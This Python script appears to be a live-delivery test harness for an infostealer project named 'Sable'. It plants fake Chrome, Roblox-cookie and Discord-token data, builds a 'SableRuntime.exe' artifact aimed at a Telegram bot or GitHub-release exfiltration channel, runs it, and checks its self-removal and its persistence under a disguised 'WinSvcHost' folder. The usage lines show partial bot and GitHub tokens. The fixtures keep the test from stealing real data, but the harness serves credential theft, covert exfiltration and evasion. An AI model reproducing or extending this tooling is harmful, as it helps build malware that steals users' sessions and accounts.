"""Build an artifact for one live relay channel, run it, and report what it left behind.

The collection side is a store-mode fixture under redirected ``LOCALAPPDATA``, so the
archive carries the planted token and nothing from this desktop. That is deliberate: the
thing under test here is the *delivery*, and a payload of somebody's real cookies going
to a chat or a release page would make the test itself the incident. The memory half is
skipped for the same reason — it scans live processes and would pull real sessions in.

    python live_channel.py telegram "9100719621:AAE...$8091562135" telegram
    python live_channel.py phantom  "ytripdame-sudo/SableResults$ghp_..." phantom

Verification of the delivery happens at the channel, not here: the Telegram API answers
with a message id and a document id, and GitHub answers with a release page. Those are
printed by the probes that call them, not by a line in this script that says "ok".
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import sable_fixture as fixture  # noqa: E402

LIVE = HERE / "_out" / "live"
PYTHON = sys.executable


def main() -> int:
    if len(sys.argv) < 4:
        raise SystemExit("usage: live_channel.py <kind> <endpoint> <label>")

    kind, endpoint, label = sys.argv[1], sys.argv[2], sys.argv[3]
    work = HERE / "_out" / "live-channel" / label
    if work.exists():
        shutil.rmtree(work)
    work.mkdir(parents=True)

    local = work / "local"
    local.mkdir()
    profile = fixture.build(local / "Google" / "Chrome")
    fixture.roblox_cookie(profile)
    fixture.discord_token(profile)

    artifact = work / "SableRuntime.exe"
    build = subprocess.run(
        [PYTHON, str(HERE / "runtime_build.py"), endpoint, str(artifact), "6", kind],
        capture_output=True,
        text=True,
    )
    print(build.stdout.strip() or build.stderr.strip())
    if build.returncode != 0 or not artifact.is_file():
        print("FAIL  build")
        return 1

    env = dict(os.environ)
    env["LOCALAPPDATA"] = str(local)
    env["APPDATA"] = str(work / "roaming")
    env["USERPROFILE"] = str(work / "home")
    for name in ("APPDATA", "USERPROFILE"):
        Path(env[name]).mkdir(parents=True, exist_ok=True)
    # The desktop shell exports a proxy that 502s every relay target; an artifact that
    # inherits it looks like a delivery failure that is not one.
    for name in ("ALL_PROXY", "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
                 "all_proxy", "http_proxy", "https_proxy", "no_proxy"):
        env.pop(name, None)

    started = time.monotonic()
    child = subprocess.run([str(artifact)], cwd=str(work), env=env, timeout=600)
    elapsed = round(time.monotonic() - started, 1)
    print(f"exit           {child.returncode}  after {elapsed} s")

    # Self-removal is a detached cmd that waits for the image to unlock, so reading the
    # directory the instant the parent exits reports a failure that has not happened yet.
    time.sleep(20)
    leftover = artifact.parent / (artifact.name + ".old")
    print(f"cleanup        exe_after={artifact.exists()}  exe_old={leftover.exists()}  "
          f"queue={(local / 'DeliveryQueue').exists()}  "
          f"persist={(local / 'Programs' / 'WinSvcHost').exists()}")
    return 0 if child.returncode == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
